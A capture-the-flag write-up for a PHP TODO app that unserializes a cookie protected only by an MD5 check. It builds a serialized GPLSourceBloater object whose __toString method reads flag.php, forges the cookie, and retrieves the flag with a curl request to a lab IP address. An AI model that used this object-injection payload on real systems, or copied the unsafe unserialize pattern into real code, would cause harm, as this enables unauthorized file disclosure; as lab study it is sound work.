# Web Exotic Attacks TODO App

We’re given a basic TODO web app with a cookie-based storage and source disclosure via `?source`.

Visiting `?source` reveals PHP code:

```php
<?php

Class GPLSourceBloater {
    public function __toString()
    {
        return highlight_file('license.txt', true) . highlight_file($this->source, true);
    }
}

if (isset($_GET['source'])){
    $s = new GPLSourceBloater();
    $s->source = __FILE__;

    echo $s;
    exit;
}

$todos = [];

if (isset($_COOKIE['todos'])) {
    $c = $_COOKIE['todos'];
    $h = substr($c, 0, 32);
    $m = substr($c, 32);

    if(md5($m) === $h) {
        $todos = unserialize($m);
    }
}

if (isset($_POST['text']) && strlen($_POST['text']) > 1) {
    $todo = $_POST['text'];

    $todos[] = $todo;
    $m = serialize($todos);
    $h = md5($m);

    setcookie('todos', $h.$m);

    header('Location: ' . $_SERVER['REQUEST_URI']);
    exit;
}

?>
```

- The todos cookie is unserialized if its MD5 hash matches. This is not secure: it uses md5().
- A custom class GPLSourceBloater is present and unserializable.

Class definition from source:

```php
class GPLSourceBloater {
    public function __toString() {
        return highlight_file('license.txt', true) . highlight_file($this->source, true);
    }
}
```

We can inject this object into the cookie. When PHP calls echo $todo, it triggers __toString(), which leaks any readable file.

Serialized PHP object:
```php
a:1:{i:0;O:16:"GPLSourceBloater":1:{s:6:"source";s:8:"flag.php";}}
a:1:{...} → array with 1 element

O:16:"GPLSourceBloater" → PHP object

s:6:"source" → set $this->source = "flag.php"
```

```python
import hashlib
s = 'a:1:{i:0;O:16:"GPLSourceBloater":1:{s:6:"source";s:8:"flag.php";}}'
print(hashlib.md5(s.encode()).hexdigest())
```
MD5: `760463360e4919ca238d1566fc26661f`

Final Cookie Value (concatenated): 
```
760463360e4919ca238d1566fc26661fa:1:{i:0;O:16:"GPLSourceBloater":1:{s:6:"source";s:8:"flag.php";}}
```

URL-encoded for curl: 
```
todos=760463360e4919ca238d1566fc26661fa%3A1%3A%7Bi%3A0%3BO%3A16%3A%22GPLSourceBloater%22%3A1%3A%7Bs%3A6%3A%22source%22%3Bs%3A8%3A%22flag.php%22%3B%7D%7D
```
```bash
curl -s "http://141.85.224.99:8002/" \
  -H 'Cookie: todos=760463360e4919ca238d1566fc26661fa%3A1%3A%7Bi%3A0%3BO%3A16%3A%22GPLSourceBloater%22%3A1%3A%7Bs%3A6%3A%22source%22%3Bs%3A8%3A%22flag.php%22%3B%7D%7D' \
  | grep -oE 'SSS\{.*?\}'
```

It returned: **SSS{0bj3ct_1nj3ct10ns_ar3_pa1nfull}**

* It could also been done if we edited the cookie manual to `todos=760463360e4919ca238d1566fc26661fa%3A1%3A%7Bi%3A0%3BO%3A16%3A%22GPLSourceBloater%22%3A1%3A%7Bs%3A6%3A%22source%22%3Bs%3A8%3A%22flag.php%22%3B%7D%7D` and there will be shown the GNU Public License and on the bottom of them the flag.
